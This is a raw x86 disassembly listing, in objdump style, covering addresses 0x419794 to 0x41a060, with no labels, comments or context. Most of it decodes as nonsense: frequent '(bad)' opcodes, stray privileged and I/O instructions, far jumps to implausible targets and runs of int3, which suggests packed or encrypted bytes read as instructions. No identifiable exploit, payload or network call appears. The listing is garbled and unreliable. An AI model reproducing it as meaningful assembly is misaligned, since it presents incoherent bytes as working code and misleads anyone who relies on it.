  419794:	add    DWORD PTR [ecx],edx
  419796:	jae    0x419751
  419798:	jmp    0x419761
  41979a:	mov    bh,0x5c
  41979c:	add    BYTE PTR [eax],al
  41979e:	cli    
  41979f:	add    al,0x89
  4197a1:	inc    ebp
  4197a2:	sbb    al,BYTE PTR [edi-0x2705ef88]
  4197a8:	or     al,0x8b
  4197aa:	scas   eax,DWORD PTR es:[edi]
  4197ab:	cmp    DWORD PTR fs:[ecx],0xc704d8fa
  4197b2:	mov    bh,0x5c
  4197b4:	(bad)  
  4197b5:	(bad)  
  4197b6:	cli    
  4197b7:	add    al,0x89
  4197b9:	push   ebp
  4197ba:	push   es
  4197bb:	xchg   DWORD PTR [edx],edi
	...
  4197cd:	add    BYTE PTR [eax],al
  4197cf:	add    BYTE PTR [esi-0x1c],ch
  4197d2:	mov    BYTE PTR [ebp-0x1a],al
  4197d5:	mov    cs,WORD PTR [eax]
  4197d7:	sbb    ebx,0x7a000005
  4197dd:	fstp   DWORD PTR [ebx]
  4197df:	mov    ebp,DWORD PTR [edi]
  4197e1:	pop    ecx
  4197e2:	mov    DWORD PTR [edx],eax
  4197e4:	pop    ss
  4197e5:	(bad)  
  4197e6:	std    
  4197e7:	inc    DWORD PTR [ebp-0x4b]
  4197ea:	mov    BYTE PTR [ebp-0x42],cl
  4197ed:	mov    ah,0xe7
  4197ef:	mov    ch,0xb7
  4197f1:	(bad)  
  4197f2:	std    
  4197f3:	xor    DWORD PTR [esi-0x39ba78f3],0x6e
  4197fa:	sbb    al,0x8b
  4197fc:	inc    edi
  4197fd:	pop    ecx
  4197fe:	mov    DWORD PTR [edx],eax
  419800:	adc    eax,0xd268d07
  419806:	add    dl,BYTE PTR [edx+0x71]
  419809:	enter  0x50fb,0x92
  41980d:	jp     0x41980a
  41980f:	push   DWORD PTR [ebp-0x7a]
  419812:	les    ecx,FWORD PTR [eax]
  419814:	or     eax,0xffffffdb
  419817:	mov    esi,DWORD PTR [edi+0x3e558958]
  41981d:	mov    WORD PTR [edi],cs
  41981f:	mov    edi,DWORD PTR [edi-0x93f7ea8]
  419825:	mov    eax,DWORD PTR [ebx-0xc]
  419828:	jno    0x4197fa
  41982a:	jmp    0x4197af
  41982c:	cmp    ecx,DWORD PTR [ecx]
  41982e:	xchg   DWORD PTR [ebp+0x26],ecx
  419831:	outs   dx,BYTE PTR ds:[esi]
  419832:	xchg   ebp,eax
  419833:	mov    eax,DWORD PTR [eax]
	...
  419845:	add    bh,al
  419847:	fs add edx,0xe0538c0e
  41984e:	adc    edx,DWORD PTR [ebx]
  419850:	std    
  419851:	call   DWORD PTR ds:0x395de38e
  419857:	push   ecx
  419858:	int3   
  419859:	int3   
  41985a:	scas   eax,DWORD PTR es:[edi]
  41985b:	(bad)  
  41985c:	in     al,dx
  41985d:	or     DWORD PTR [esi],0xd
  419860:	push   0xffc4f8f0
  419865:	inc    BYTE PTR [edi]
  419867:	inc    ebp
  419868:	push   ebx
  419869:	inc    ecx
  41986a:	cli    
  41986b:	mov    eax,DWORD PTR [ebx-0x8]
  41986e:	push   edx
  41986f:	popa   
  419870:	add    al,BYTE PTR [eax-0x6]
  419873:	lea    eax,[ebx-0x8]
  419876:	sub    ch,BYTE PTR [ebp+0x3e]
  419879:	std    
  41987a:	lds    esp,FWORD PTR [ecx-0x7f]
  41987d:	(bad)  
  41987e:	repnz mov eax,DWORD PTR [ebx-0x4]
  419882:	or     edi,0xb781510f
  419888:	or     edx,DWORD PTR [edx+0x71]
  41988b:	mov    DWORD PTR [edi],0xfbb79d50
  419891:	mov    ebx,DWORD PTR [edi-0x41333f41]
  419897:	push   eax
  419898:	int3   
  419899:	int3   
  41989a:	das    
  41989b:	mov    gs,esp
  41989d:	mov    eax,ds:0x3ebade
  4198a2:	cmp    al,0x4
  4198a4:	push   0x55f9078b
  4198a9:	inc    ecx
	...
  4198ba:	add    BYTE PTR [eax],al
  4198bc:	cli    
  4198bd:	mov    edx,DWORD PTR [eax+0x1]
  4198c0:	test   al,0x45
  4198c2:	mov    BYTE PTR [eax-0x1],dl
  4198c5:	mov    edi,0x503eccc0
  4198ca:	int3   
  4198cb:	int3   
  4198cc:	scas   eax,DWORD PTR es:[edi]
  4198cd:	(bad)  
  4198ce:	in     al,dx
  4198cf:	or     DWORD PTR [esi+0x10],0xffffff9f
  4198d3:	adc    ah,cl
  4198d5:	ret    
  4198d6:	dec    DWORD PTR [edx+0x3ec71548]
  4198dc:	jno    0x4198a2
  4198de:	das    
  4198df:	mov    ecx,DWORD PTR [eax-0x73]
  4198e2:	sar    BYTE PTR [esi],cl
  4198e4:	or     esp,0x8b288b0b
  4198ea:	dec    ebx
  4198eb:	hlt    
  4198ec:	jno    0x4198b5
  4198ee:	repz mov esi,DWORD PTR [edx-0xdb278f0]
  4198f5:	mov    WORD PTR [ebx-0x8],ss
  4198f8:	cmp    DWORD PTR [edx+0x4fbb8fb],0x0
  4198ff:	add    BYTE PTR [edi+0x45],dh
  419902:	je     0x419948
  419904:	jns    0x4198e8
  419906:	test   DWORD PTR [eax],0xc0310947
  41990c:	shl    DWORD PTR [ecx],1
  41990e:	mov    DWORD PTR [ebp-0x3e],ecx
  419911:	mov    WORD PTR [edi+0x18],cs
  419914:	icebp  
  419915:	mov    ecx,0x8c137507
  41991a:	inc    ebx
  41991b:	clc    
  41991c:	jno    0x4198f0
  41991e:	or     ecx,DWORD PTR [ecx+0x0]
	...
  419930:	add    BYTE PTR [eax],al
  419932:	xor    al,BYTE PTR [ecx]
  419934:	mov    DWORD PTR [ebp-0x6e],edx
  419937:	mov    WORD PTR [ebx+0x10],es
  41993a:	add    ebx,0x17
  41993d:	mov    eax,0x4fb
  419942:	xchg   ecx,eax
  419943:	std    
  419944:	mov    BYTE PTR [ebp+0x72],cl
  419947:	mov    WORD PTR [edi],cs
  419949:	mov    edi,eax
  41994b:	pop    esp
  41994c:	mov    DWORD PTR [ebp+0x62],eax
  41994f:	sbb    al,0x43
  419951:	cld    
  419952:	out    0x8,eax
  419954:	xor    eax,eax
  419956:	popa   
  419957:	or     ecx,ebp
  419959:	mov    bl,0x9
  41995b:	inc    ebp
  41995c:	mov    ebp,esp
  41995e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41995f:	inc    ebx
  419960:	int3   
  419961:	int3   
  419962:	cs push ecx
  419964:	int3   
  419965:	int3   
  419966:	inc    esi
  419967:	push   ecx
  419968:	int3   
  419969:	int3   
  41996a:	ds push ecx
  41996c:	int3   
  41996d:	int3   
  41996e:	iret   
  41996f:	mov    ebp,esp
  419971:	or     DWORD PTR [esi],0xfffffffd
  419974:	les    eax,FWORD PTR [ebp+0x12]
  419977:	add    eax,0xecfa0030
  41997c:	add    eax,DWORD PTR [ebx]
  41997e:	mov    edx,0xa7fc9f04
  419983:	(bad)  
  419986:	loop   0x41993b
  419988:	sti    
  419989:	(bad)  
  41998a:	in     eax,dx
  41998b:	add    esp,0x8
  41998e:	jae    0x419959
  419990:	repz push 0x3a
  419993:	mov    WORD PTR [ebx-0x8],cs
	...
  4199a6:	add    BYTE PTR [eax],al
  4199a8:	sub    ecx,DWORD PTR [ebx+edx*1-0x39d824]
  4199af:	mov    bh,BYTE PTR [eax]
  4199b1:	mov    ch,0x4f
  4199b3:	push   0xfffffffa
  4199b5:	pop    edi
  4199b6:	push   ebx
  4199b7:	hlt    
  4199b8:	pop    ecx
  4199b9:	cmp    BYTE PTR [ebx+0x41],dl
  4199bc:	cli    
  4199bd:	cmp    DWORD PTR [ebx],0xffffffd4
  4199c0:	dec    edi
  4199c1:	(bad)  
  4199c2:	(bad)  
  4199c3:	jmp    DWORD PTR [edi]
  4199c5:	or     BYTE PTR [eax+0x4fa02],bh
  4199cb:	jmp    0x4199ed
  4199cd:	mov    WORD PTR [ebx],cs
  4199cf:	add    al,bh
  4199d1:	(bad)  
  4199d2:	dec    DWORD PTR [eax+0x68552f]
  4199d8:	iret   
  4199d9:	add    eax,0x2fa6800
  4199de:	inc    eax
  4199df:	add    BYTE PTR [ecx-0x7],dh
  4199e2:	rcl    DWORD PTR [ebp-0x45],cl
  4199e5:	add    al,0x7f
  4199e7:	ret    0x2fa
  4199ea:	add    BYTE PTR [eax],al
  4199ec:	test   al,0x6c
  4199ee:	sahf   
  4199ef:	inc    BYTE PTR [ebp+0x5f]
  4199f2:	add    esp,0x2009cee
  4199f8:	mov    edx,0xf8002b04
  4199fd:	add    al,0x0
  4199ff:	mov    esi,edi
  419a01:	cmp    BYTE PTR [ebx+0x41],dl
  419a04:	cli    
  419a05:	sub    ecx,eax
  419a07:	mov    DWORD PTR [edi],eax
  419a09:	or     DWORD PTR [esi+0x41],edx
	...
  419a1c:	add    BYTE PTR [eax],al
  419a1e:	cli    
  419a1f:	mov    edx,DWORD PTR [ebx]
  419a21:	add    al,0xac
  419a23:	vsqrtsd xmm3,xmm0,QWORD PTR [ebx+0x38]
  419a28:	push   ebx
  419a29:	inc    ecx
  419a2a:	cli    
  419a2b:	mov    ah,0x88
  419a2d:	dec    ebp
  419a2e:	jmp    0xfd5e:0xe69de7b4
  419a35:	xor    DWORD PTR [esi-0x51ea76ef],0xffffffb8
  419a3c:	ds add cl,bh
  419a3f:	mov    bh,0x7
  419a41:	mov    DWORD PTR [edi],ebp
  419a43:	ins    DWORD PTR es:[edi],dx
  419a44:	mov    DWORD PTR [ebp-0x2e],edx
  419a47:	pop    esi
  419a48:	loop   0x4199d5
  419a4a:	lahf   
  419a4b:	rol    al,0xcc
  419a4e:	mov    esi,0x4fcccc51
  419a53:	mov    ch,ah
  419a55:	mov    esi,DWORD PTR [edi]
  419a57:	or     eax,0xd2064539
  419a5c:	add    al,0x8b
  419a5e:	aaa    
  419a5f:	or     eax,0x29105e9
  419a64:	mov    DWORD PTR [ebp-0x12],eax
  419a67:	mov    edi,0x5146ccc0
  419a6c:	int3   
  419a6d:	int3   
  419a6e:	ds push ecx
  419a70:	int3   
  419a71:	int3   
  419a72:	iret   
  419a73:	mov    esp,ebp
  419a75:	or     DWORD PTR [esi+0x31],0xffffffc5
  419a79:	inc    ebp
  419a7a:	push   esi
  419a7b:	add    eax,0x89fa0170
  419a80:	inc    ebx
  419a81:	or     BYTE PTR [eax],al
	...
  419a93:	add    BYTE PTR [ebx-0x38],dh
  419a96:	xlat   BYTE PTR ds:[ebx]
  419a97:	mov    ebp,DWORD PTR [edi+0x255893c]
  419a9d:	add    cl,BYTE PTR [edi+0x3c]
  419aa0:	cmp    DWORD PTR [eax+0x64bf8bdf],0xd
  419aa7:	mov    bh,0xb2
  419aa9:	clc    
  419aaa:	mov    BYTE PTR [ebp+0x1a],dl
  419aad:	nop
  419aae:	inc    esp
  419aaf:	or     dh,dl
  419ab1:	mov    eax,DWORD PTR [ebx-0x18]
  419ab4:	xchg   edx,eax
  419ab5:	clc    
  419ab6:	add    BYTE PTR [eax-0x6],al
  419ab9:	mov    DWORD PTR [ebx],ecx
  419abb:	cld    
  419abc:	dec    edi
  419abd:	(bad)  
  419abe:	call   DWORD PTR [eax-0x1e]
  419ac1:	int    0xf8
  419ac3:	jmp    ebp
  419ac5:	add    esp,0xefc77308
  419acb:	push   0x3a
  419acd:	in     eax,dx
  419ace:	jmp    FWORD PTR [edi]
  419ad0:	cli    
  419ad1:	add    al,0x68
  419ad3:	add    BYTE PTR [edx+0x4],cl
  419ad6:	add    BYTE PTR [edx-0x6],ch
  419ad9:	pop    ebp
  419ada:	push   ebx
  419adb:	lock add edi,0xffffffe3
  419adf:	mov    eax,DWORD PTR [edi+0x65]
  419ae2:	mov    DWORD PTR [edx+0x4e],eax
  419ae5:	mov    ch,0x88
  419ae7:	dec    ebp
  419ae8:	repnz mov bl,0x88
  419aeb:	push   ebp
  419aec:	sahf   
  419aed:	mov    dl,0xe7
  419aef:	ror    DWORD PTR [edi-0x417c02a3],0x10
  419af6:	lds    eax,FWORD PTR [ebp+0x0]
	...
  419b09:	add    BYTE PTR [esi-0x5fffffc],al
  419b0f:	imul   eax,DWORD PTR [edi],0x8158b78b
  419b15:	sar    bl,0x8b
  419b18:	inc    ebx
  419b19:	hlt    
  419b1a:	jno    0x419aeb
  419b1c:	fisttp WORD PTR [edi]
  419b1e:	lea    esi,[ebx+0x58a73905]
  419b24:	jno    0x419b7f
  419b26:	jno    0x419aef
  419b28:	out    0x83,eax
  419b2a:	ret    0xfff8
  419b2d:	jae    0x419aee
  419b2f:	mov    DWORD PTR [ebx-0x18],ecx
  419b32:	jns    0x419b0f
  419b34:	verw   WORD PTR [esi+0x12558920]
  419b3b:	mov    DWORD PTR [edx+0x10],eax
  419b3e:	or     edi,0x20ab8bdf
  419b44:	mov    eax,DWORD PTR [edx+ebp*8+0x5d]
  419b48:	mov    DWORD PTR [ebp+0x1a],ecx
  419b4b:	adc    edx,edx
  419b4d:	imul   DWORD PTR [ebx+0x19]
  419b50:	mov    DWORD PTR [ebp-0x26],edx
  419b53:	or     al,0xad
  419b55:	inc    edx
  419b56:	es mov ch,0x88
  419b59:	inc    ebp
  419b5a:	rcl    BYTE PTR [eax-0x3306f7b5],cl
  419b60:	adc    edx,DWORD PTR [ecx-0x7f]
  419b63:	mov    dl,0xe7
  419b65:	mov    edi,DWORD PTR [edi]
  419b67:	popa   
  419b68:	add    DWORD PTR [edx-0x12],eax
  419b6b:	mov    ah,0xe7
  419b6d:	push   ebp
	...
  419b7e:	add    BYTE PTR [eax],al
  419b80:	mov    bh,0x5c
  419b82:	std    
  419b83:	xor    DWORD PTR [esi-0x6db276f7],0xffffff88
  419b8a:	mov    edi,0xe7ca7328
  419b8f:	jmp    0x419bf9
  419b91:	nop
  419b92:	push   ebx
  419b93:	in     al,0x28
  419b95:	ins    DWORD PTR es:[edi],dx
  419b96:	push   cs
  419b97:	cld    
  419b98:	test   DWORD PTR [ecx+eax*4-0x3c],ebx
  419b9c:	imul   ah
  419b9e:	and    eax,DWORD PTR [ebx]
  419ba0:	mov    edx,0xc7fc9f04
  419ba5:	(bad)  
  419ba8:	push   edx
  419ba9:	nop
  419baa:	cli    
  419bab:	call   FWORD PTR [ebp-0x78]
  419bae:	les    ecx,FWORD PTR [eax]
  419bb0:	add    edx,0xffffffdb
  419bb3:	or     DWORD PTR [edi],0x5d
  419bb6:	push   ebx
  419bb7:	inc    ecx
  419bb8:	cli    
  419bb9:	add    al,0x73
  419bbb:	or     dh,BYTE PTR [ecx+0xa]
  419bbe:	lock push ebp
  419bc0:	mov    ebx,0xc7ff4f04
  419bc5:	cmp    BYTE PTR [ecx+0x3eb2223d],al
  419bcb:	add    dl,bh
  419bcd:	rcr    DWORD PTR [ebx],1
  419bcf:	push   0xffffffba
  419bd1:	in     al,dx
  419bd2:	jmp    FWORD PTR [edi]
  419bd4:	cli    
  419bd5:	add    al,0x89
  419bd7:	push   ebp
  419bd8:	push   es
  419bd9:	mov    bh,0x88
  419bdb:	inc    ebp
  419bdc:	sbb    dl,BYTE PTR [eax+0x5c4b3448]
  419be2:	push   ebx
  419be3:	lock add BYTE PTR [eax],al
	...
  419bf6:	cdq    
  419bf7:	xor    BYTE PTR [ebx+0x41],dl
  419bfa:	cli    
  419bfb:	outs   dx,DWORD PTR ds:[esi]
  419bfc:	adc    ebp,DWORD PTR [edx+0x3a]
  419bff:	in     eax,dx
  419c00:	jmp    FWORD PTR [edi]
  419c02:	cli    
  419c03:	add    al,0x89
  419c05:	push   ebp
  419c06:	into   
  419c07:	mov    dh,0x69
  419c09:	add    ch,al
  419c0b:	mov    cl,0xef
  419c0d:	mov    ds:0x3eb1a6,eax
  419c12:	jns    0x419c2d
  419c14:	aam    0x55
  419c16:	cmp    eax,DWORD PTR ds:0xef0f7500
  419c1c:	aas    
  419c1d:	push   0x14fa
  419c22:	add    ecx,0x52050fb
  419c28:	std    
  419c29:	push   ebp
  419c2a:	mov    ah,BYTE PTR [edi+0x53b55d4]
  419c30:	mov    DWORD PTR [ebp+0x5e],ecx
  419c33:	lea    ecx,[ebx-0x28]
  419c36:	xor    DWORD PTR [ecx+0x3cbf8bd7],0x8e1e4201
  419c40:	inc    ebx
  419c41:	loopne 0x419bc4
  419c43:	leave  
  419c44:	sti    
  419c45:	push   ecx
  419c46:	xor    DWORD PTR [ecx+0x309b52e3],0xb4fa4153
  419c50:	out    0x95,eax
  419c52:	ss pop ebx
  419c54:	std    
  419c55:	xor    DWORD PTR [esi],0x8
  419c58:	mov    DWORD PTR [ebp+0x0],ecx
	...
  419c6b:	add    BYTE PTR [edx],bl
  419c6d:	xchg   DWORD PTR [edi+0x4faa4],esi
  419c73:	add    BYTE PTR [esi+0x1a55891e],cl
  419c79:	pop    DWORD PTR [ebx-0x28]
  419c7c:	stc    
  419c7d:	xchg   BYTE PTR [eax-0x78fb0600],ah
  419c83:	inc    ebp
  419c84:	out    0x8e,al
  419c86:	dec    ebx
  419c87:	loopne 0x419c0a
  419c89:	lock rcl DWORD PTR [ebp+0x3b],cl
  419c8d:	add    eax,0x8c265129
  419c92:	adc    eax,DWORD PTR [esp+ebp*1]
  419c95:	(bad)  
  419c96:	jmp    DWORD PTR [eax+0x3eb2f6]
  419c9c:	sub    cl,BYTE PTR [esi-0x3bd82bf5]
  419ca2:	call   DWORD PTR [eax-0x7f]
  419ca5:	mov    al,0xeb
  419ca7:	push   edx
  419ca8:	mov    ds:0xa5fff9da,al
  419cad:	xchg   ah,al
  419caf:	or     al,0x71
  419cb1:	rcr    bh,0x8b
  419cb4:	pop    es
  419cb5:	xor    DWORD PTR [ebx+0x41],edx
  419cb8:	cli    
  419cb9:	add    eax,0x8732848
  419cbe:	adc    al,0x56
  419cc0:	cmp    eax,DWORD PTR ds:0xb0723d81
  419cc6:	ds add dl,bh
  419cc9:	iret   
  419cca:	sub    cl,BYTE PTR [ebx+0x4153310f]
	...
  419ce0:	add    BYTE PTR [eax],al
  419ce2:	cli    
  419ce3:	mov    dh,0x9e
  419ce5:	adc    al,0xac
  419ce7:	ret    
  419ce8:	dec    DWORD PTR [edi-0x7f]
  419ceb:	or     al,dh
  419ced:	push   ebp
  419cee:	mov    ebx,0xc2e84f04
  419cf3:	pop    eax
  419cf4:	std    
  419cf5:	(bad)  
  419cf6:	jns    0x419d39
  419cf8:	or     al,0x8b
  419cfa:	pop    es
  419cfb:	xor    DWORD PTR [ebx+0x41],edx
  419cfe:	cli    
  419cff:	mov    dh,0xe7
  419d01:	dec    ecx
  419d02:	and    ebx,DWORD PTR [edx-0x3]
  419d05:	cmp    DWORD PTR [esi],0x1
  419d08:	jmp    0x1523f6e
  419d0d:	inc    eax
  419d0e:	cli    
  419d0f:	mov    ds:0x4bb55fc,eax
  419d14:	push   eax
  419d15:	call   0x3ef968
  419d1a:	jns    0x419d5c
  419d1c:	or     BYTE PTR [ecx+0xd89313f],cl
  419d22:	(bad)  
  419d23:	scas   eax,DWORD PTR es:[edi]
  419d24:	add    BYTE PTR ds:[ebx],ch
  419d27:	mov    ss,WORD PTR [ebx-0x20]
  419d2a:	fwait
  419d2b:	xor    BYTE PTR [ebx+0x41],dl
  419d2e:	cli    
  419d2f:	add    eax,0x8e2a2842
  419d34:	or     esi,eax
  419d36:	dec    edi
  419d37:	(bad)  
  419d38:	call   DWORD PTR [eax-0x5e]
  419d3b:	sub    esp,edi
  419d3d:	jmp    DWORD PTR [ebp+0x710cc485]
  419d43:	out    dx,eax
  419d44:	out    dx,eax
  419d45:	push   ebp
	...
  419d56:	add    BYTE PTR [eax],al
  419d58:	cmp    eax,DWORD PTR ds:0xb62ac27f
  419d5e:	(bad)  
  419d5f:	push   DWORD PTR [ebx-0x11]
  419d62:	sbb    edx,DWORD PTR [esi+0x3b]
  419d65:	add    eax,0xb472458b
  419d6a:	imul   eax,DWORD PTR [eax-0x20],0x60d8902
  419d71:	mov    bl,0x3e
  419d73:	add    bl,cl
  419d75:	pop    ecx
  419d76:	push   ebx
  419d77:	aam    0x62
  419d79:	gs stc 
  419d7b:	dec    DWORD PTR [ebp-0x64]
  419d7e:	(bad)  
  419d7f:	(bad)  
  419d80:	cli    
  419d81:	add    al,0x89
  419d83:	in     eax,0x9f
  419d85:	inc    esi
  419d86:	add    al,0x0
  419d88:	inc    esi
  419d89:	dec    eax
  419d8a:	int3   
  419d8b:	int3   
  419d8c:	ds dec eax
  419d8e:	int3   
  419d8f:	int3   
  419d90:	iret   
  419d91:	(bad)  
  419d92:	in     al,dx
  419d93:	mov    esi,DWORD PTR [edi+0x1640890c]
  419d99:	mov    bh,0xc0
  419d9b:	int3   
  419d9c:	ds dec eax
  419d9e:	int3   
  419d9f:	int3   
  419da0:	scas   eax,DWORD PTR es:[edi]
  419da1:	(bad)  
  419da2:	in     al,dx
  419da3:	push   ebx
  419da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da5:	mov    cl,0x88
  419da7:	cmp    eax,0x3eb2da
  419dac:	cmp    edx,0x53b55eb
  419db2:	mov    DWORD PTR ds:0x3eb2c2,esi
  419db8:	xor    eax,0x5d58b7
	...
  419dcd:	add    BYTE PTR [ecx+0x2fcccc49],bh
  419dd3:	mov    esp,gs
  419dd5:	push   ecx
  419dd6:	push   edx
  419dd7:	rol    DWORD PTR [eax],0x40
  419dda:	cli    
  419ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ddc:	cld    
  419ddd:	push   ebp
  419dde:	cmp    eax,DWORD PTR ds:0x5d56e850
  419de4:	std    
  419de5:	(bad)  
  419de6:	jns    0x419e29
  419de8:	or     BYTE PTR [ecx+0x4d89593f],cl
  419dee:	add    dh,BYTE PTR [esi-0xd8eff97]
  419df4:	pop    ss
  419df5:	push   esi
  419df6:	cmp    eax,DWORD PTR ds:0x58cfff52
  419dfc:	mov    ebp,esp
  419dfe:	iret   
  419dff:	inc    ebx
  419e00:	int3   
  419e01:	int3   
  419e02:	iret   
  419e03:	mov    ebp,esp
  419e05:	or     DWORD PTR [esi+0x21],0xffffffc5
  419e09:	inc    ebp
  419e0a:	push   edx
  419e0b:	add    eax,0x3ffa0000
  419e10:	inc    ebx
  419e11:	fadd   st(2),st
  419e13:	add    al,0x0
  419e15:	add    BYTE PTR ds:0xfa01f3c2,dh
  419e1b:	add    al,0x0
  419e1d:	(bad)  
  419e1e:	mov    bh,0x58
  419e20:	add    BYTE PTR [eax],al
  419e22:	cli    
  419e23:	add    al,0xc5
  419e25:	inc    ebp
  419e26:	push   ss
  419e27:	add    eax,0x8bfa0000
  419e2c:	dec    ebx
  419e2d:	or     BYTE PTR [ebx+0x55f00a],al
	...
  419e43:	add    BYTE PTR [ebx+0x5a9e804],bh
  419e49:	pop    eax
  419e4a:	std    
  419e4b:	mov    eax,ds:0x3eb1ea
  419e50:	pop    ss
  419e51:	pop    eax
  419e52:	std    
  419e53:	add    dl,bh
  419e55:	ror    BYTE PTR [ebx],1
  419e57:	(bad)  
  419e58:	neg    DWORD PTR [ebx+edx*2+0x41]
  419e5c:	cli    
  419e5d:	add    al,0x0
  419e5f:	add    dl,bh
  419e61:	imul   ecx,DWORD PTR [edx],0xffffffc7
  419e64:	call   FWORD PTR [ebx+edx*2+0x41]
  419e68:	cli    
  419e69:	add    eax,0x83fa0000
  419e6e:	cmp    esi,eax
  419e70:	inc    edi
  419e71:	(bad)  
  419e72:	(bad)  
  419e73:	jmp    FWORD PTR [edi]
  419e75:	or     eax,ebp
  419e77:	add    eax,0x3eb1a2
  419e7c:	cli    
  419e7d:	add    al,0x0
  419e7f:	add    BYTE PTR [ecx+0x19],bh
  419e82:	clc    
  419e83:	push   ebp
  419e84:	cmp    eax,DWORD PTR ds:0xeaef7500
  419e8a:	(bad)  
  419e8b:	dec    BYTE PTR [edi]
  419e8d:	inc    ebp
  419e8e:	push   ebx
  419e8f:	inc    ecx
  419e90:	cli    
  419e91:	mov    ds:0x4bb55f0,eax
  419e96:	mov    DWORD PTR ds:0x3eb16a,ecx
  419e9c:	or     ecx,0xffffffe7
  419e9f:	mov    esp,edi
  419ea1:	push   esp
  419ea2:	push   ebx
  419ea3:	inc    ecx
  419ea4:	cli    
  419ea5:	mov    eax,DWORD PTR [ebx-0x18]
	...
  419eb8:	add    BYTE PTR [eax],al
  419eba:	stc    
  419ebb:	ret    0x893b
  419ebe:	mov    edi,0x224d896c
  419ec3:	lea    ecx,[ebx]
  419ec5:	fmul   st(7),st
  419ec7:	(bad)  
  419eca:	retf   0x4003
  419ecd:	add    BYTE PTR ds:0xbb55bff1,dl
  419ed3:	add    al,0xa1
  419ed5:	cld    
  419ed6:	scas   eax,DWORD PTR es:[edi]
  419ed7:	vshufps ymm6,ymm0,ymm7,0x8
  419edc:	push   esi
  419edd:	inc    ecx
  419ede:	cli    
  419edf:	iret   
  419ee0:	add    BYTE PTR [eax-0x6],al
  419ee3:	in     al,dx
  419ee4:	pop    edi
  419ee5:	add    edi,DWORD PTR [edx]
  419ee7:	add    eax,0xb0de1589
  419eec:	add    BYTE PTR ds:[eax],ch
  419eef:	ins    DWORD PTR es:[edi],dx
  419ef0:	ret    0xcdf7
  419ef3:	push   esi
  419ef4:	add    esp,0x5608a1f2
  419efa:	cmp    eax,DWORD PTR ds:0xaf0215fd
  419f00:	add    BYTE PTR ds:[ecx-0x3],bl
  419f04:	push   ebp
  419f05:	inc    ecx
  419f06:	cli    
  419f07:	mov    ds:0x53b560c,eax
  419f0c:	push   eax
  419f0d:	call   0x3ef660
  419f12:	jns    0x419f55
  419f14:	add    al,0x89
  419f16:	aas    
  419f17:	push   ebp
  419f18:	mov    DWORD PTR [ebp-0x76],ecx
  419f1b:	mov    ah,0xe7
  419f1d:	aad    0x0
	...
  419f2f:	add    BYTE PTR [esi+edx*2-0x3],dh
  419f33:	xor    DWORD PTR [esi],0x1
  419f36:	mov    eax,ds:0xffc3cff4
  419f3b:	mov    al,bh
  419f3d:	push   esp
  419f3e:	push   edx
  419f3f:	push   0xfffffffa
  419f41:	mov    ds:0x4bb55f4,eax
  419f46:	push   eax
  419f47:	call   0x3eedb2
  419f4c:	jns    0x419f8f
  419f4e:	or     al,0x8b
  419f50:	(bad)  
  419f51:	push   esp
  419f52:	xchg   DWORD PTR [ebp+0x1a],ecx
  419f55:	mov    dl,BYTE PTR [ebx-0x4]
  419f58:	loope  0x419f09
  419f5a:	out    dx,eax
  419f5b:	jae    0x419f1d
  419f5d:	mov    DWORD PTR [ebx-0x20],eax
  419f60:	stos   BYTE PTR es:[edi],al
  419f61:	mov    DWORD PTR [ebx-0x24],ecx
  419f64:	stos   DWORD PTR es:[edi],eax
  419f65:	ins    BYTE PTR es:[edi],dx
  419f66:	scas   al,BYTE PTR es:[edi]
  419f67:	sti    
  419f68:	add    eax,0xf2c48156
  419f6d:	mov    eax,ds:0x53b5600
  419f72:	mov    DWORD PTR ds:0x3eaefa,edx
  419f78:	dec    eax
  419f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f7a:	or     al,0x56
  419f7c:	cmp    eax,DWORD PTR ds:0xb4de4501
  419f82:	mov    BYTE PTR ds:0x3eafc6,cl
  419f88:	stc    
  419f89:	(bad)  
  419f8a:	sti    
  419f8b:	push   ecx
  419f8c:	shr    BYTE PTR ds:0x81b5fff7,cl
  419f92:	les    ecx,FWORD PTR [eax+eax*1]
	...
  419fa5:	add    BYTE PTR [ecx+0x4f03f3af],al
  419fab:	cmp    DWORD PTR [ecx],eax
  419fad:	push   ebp
  419fae:	xchg   esi,eax
  419faf:	mov    edx,DWORD PTR [ebx-0x1c]
  419fb2:	cmp    DWORD PTR [edi+0x393703fb],0x89864587
  419fbc:	dec    ebx
  419fbd:	loopne 0x419f90
  419fbf:	pop    es
  419fc0:	add    BYTE PTR [esi-0x45],dl
  419fc3:	add    al,0x87
  419fc5:	dec    ebp
  419fc6:	pop    edx
  419fc7:	imul   ebx,DWORD PTR [esi+0x5cbfc7],0xe904fa00
  419fd1:	or     DWORD PTR [ecx+0x3883f7af],eax
  419fd7:	add    BYTE PTR [edi+0x43894255],al
  419fdd:	clc    
  419fde:	add    eax,eax
  419fe0:	out    dx,eax
  419fe1:	jae    0x419fd5
  419fe3:	mov    DWORD PTR [ebx],ecx
  419fe5:	hlt    
  419fe6:	mov    ebx,0x5cb702ff
  419fec:	mov    DWORD PTR [ecx],edx
  419fee:	stc    
  419fef:	scas   eax,DWORD PTR es:[edi]
  419ff0:	mul    DWORD PTR [ecx+0x3eaf0e]
  419ff6:	stc    
  419ff7:	mov    edi,0x89ea89f7
  419ffc:	dec    ebx
  419ffd:	clc    
  419ffe:	jnp    0x41a043
  41a000:	out    0x3,eax
  41a002:	cli    
  41a003:	add    al,0x89
  41a005:	adc    eax,0x3ebae6
	...
  41a01a:	add    BYTE PTR [eax],al
  41a01c:	stc    
  41a01d:	mov    ecx,0xa5f033f7
  41a022:	hlt    
  41a023:	push   ebp
  41a024:	cmp    eax,DWORD PTR ds:0x7ed24501
  41a02a:	or     bl,ch
  41a02c:	lea    edi,[esi+0x2b]
  41a02f:	in     al,0x27
  41a031:	(bad)  
  41a032:	dec    DWORD PTR [eax+0x415364f7]
  41a038:	cli    
  41a039:	pop    ss
  41a03a:	(bad)  
  41a03b:	mov    edi,ebp
  41a03d:	sub    al,0x53
  41a03f:	inc    ecx
  41a040:	cli    
  41a041:	pop    ss
  41a042:	(bad)  
  41a043:	mov    edi,esi
  41a045:	pusha  
  41a046:	push   ebx
  41a047:	inc    ecx
  41a048:	cli    
  41a049:	pop    esp
  41a04a:	dec    esi
  41a04b:	test   DWORD PTR [ebp+0xd0d8b54],0x83003eba
  41a055:	ret    0xb9f7
  41a058:	cli    
  41a059:	push   es
  41a05a:	inc    eax
  41a05b:	add    BYTE PTR [ebx+0x5e],bh
  41a05e:	add    BYTE PTR [edx],al
  41a060:	cli    
